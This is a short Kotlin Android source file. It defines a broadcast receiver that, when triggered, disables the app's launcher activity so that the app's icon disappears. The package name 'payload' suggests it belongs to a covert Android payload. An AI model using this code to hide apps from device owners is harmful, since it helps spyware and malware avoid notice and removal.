package com.payload.secus1r

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.ComponentName
import android.content.pm.PackageManager
import android.util.Log

class HideIconReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        try {
            val pm = context.packageManager
            val componentName = ComponentName(context, LauncherActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("HideIconReceiver", "App icon hidden successfully")
        } catch (e: Exception) {
            Log.e("HideIconReceiver", "Error hiding app icon", e)
        }
    }
}
